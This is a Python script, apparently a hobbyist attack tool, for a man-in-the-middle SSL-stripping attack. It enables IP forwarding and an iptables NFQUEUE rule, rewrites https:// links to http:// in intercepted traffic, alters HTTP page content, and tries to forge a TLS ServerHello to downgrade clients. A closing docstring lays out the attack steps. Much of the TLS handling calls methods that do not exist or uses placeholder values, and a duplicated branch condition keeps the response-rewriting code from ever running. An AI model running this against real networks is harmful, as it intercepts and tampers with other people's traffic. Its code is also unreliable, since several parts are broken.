from scapy.all import *
from OpenSSL import SSL
import os
from netfilterqueue import NetfilterQueue
import re
from twisted.web import http

# Dictionary to keep track of TCP connections and SSL contexts
tcp_connections = {}
ssl_contexts = {}

# Your existing ProxyRequestHandler class
class ProxyRequestHandler(http.Request):
    def process(self):
        self.content.seek(0, 0)
        headers = self.getAllHeaders().copy()
        requestContent = self.content.read()
        headers['Content-Length'] = len(requestContent)

        # Modify the request content here
        requestContent = re.sub('https://', 'http://', requestContent)

        self.setResponseCode(200, 'OK')
        self.responseHeaders = headers
        self.write(requestContent)
        self.finish()

class Proxy(http.HTTPChannel):
    requestFactory = ProxyRequestHandler

class ProxyFactory(http.HTTPFactory):
    protocol = Proxy

def start_proxy():
    from twisted.internet import reactor
    factory = ProxyFactory()
    reactor.listenTCP(10000, factory)
    reactor.run()

# The intercept_packet function
def intercept_packet(packet):
    # Check if packet is a ClientHello message
    if packet.haslayer(TLSClientHello):
        # Get the TCP connection associated with this packet
        tcp_connection = tcp_connections.get((packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport))

        # If there is no TCP connection associated with this packet, create a new one
        if tcp_connection is None:
            tcp_connection = TCP_client.tcplink(TCP_client, packet[IP].dst, packet[TCP].dport)
            tcp_connections[(packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport)] = tcp_connection

        # Create a new ServerHello message
        server_hello = TLSRecord()/TLSHandshake()/TLSServerHello()

        # Modify the ServerHello message to indicate that we only support insecure connections
        server_hello[TLSHandshake][TLSServerHello].cipher_suite = 0x00  # This is just an example, you would need to use the correct value here

        # Send the ServerHello message back to the client over the same TCP connection
        tcp_connection.send(server_hello)

        # Establish a separate, secure connection with the server
        context = SSL.Context(SSL.TLSv1_2_METHOD)
        secure_socket = SSL.Connection(context, socket.socket())
        secure_socket.connect((packet[IP].dst, packet[TCP].dport))
        ssl_contexts[(packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport)] = context

        # Relay messages between the client and the server
        while True:
            # Receive a message from the client
            client_message = tcp_connection.recv()

            # If the client message is a TLS record, decrypt it using the SSL context
            if client_message.haslayer(TLSRecord):
                client_message = context.decrypt(client_message)

            # Send the client message to the server over the secure connection
            secure_socket.send(client_message)

            # Receive a message from the server over the secure connection
            server_message = secure_socket.recv()

            # Encrypt the server message using the SSL context and send it back to the client
            server_message = context.encrypt(server_message)
            tcp_connection.send(server_message)

# modified to call intercept_packet
def process_packet(packet):
    print("[+] Packet intercepted...")

    # Convert packet to scapy packet
    scapy_packet = IP(packet.get_payload())

    # Check if packet is a HTTP request
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("[+] TCP ...")
            load = scapy_packet[Raw].load.decode()

            # Check if the request is trying to establish a secure connection
            if 'https://' in load:
                # If it is, call the intercept_packet function to handle it
                print("[+] HTTPS ...")
                intercept_packet(scapy_packet)
            else:
                # Otherwise, modify the request as necessary
                print("[+] HTTP ...")

                load = re.sub('<html><body><h1>It works!</h1></body></html>', \
                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
                
                
                scapy_packet[Raw].load = load.encode()
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(bytes(scapy_packet))

    # Check if packet is a HTTP response
    elif scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].sport == 80:
            print("[+] HTTP Response...")
            load = scapy_packet[Raw].load.decode()

            # Modify the response as necessary
            load = re.sub('https://', 'http://', load)
            scapy_packet[Raw].load = load.encode()
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))

    # Accept packet
    packet.accept()

def start():
    # Enable IP forwarding
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Set up iptables rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Set up packet queue
    queue = NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        print("[+] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping packet interception...")
        queue.unbind()

    # Start the proxy
    start_proxy()


'''
1 When the client sends a ClientHello message to start the SSL/TLS handshake process, you intercept this message.

2 Instead of forwarding the ClientHello message to the server, you send a ServerHello message back to the client, pretending to be the server. In this message, you indicate that you only support insecure connections (i.e., connections over HTTP).

3 The client, thinking that the server only supports insecure connections, should then continue the connection over HTTP.

4 You then establish a separate, secure connection with the server, and relay messages between the client and the server, modifying them as necessary.
'''

if __name__ == "__main__":
    start()
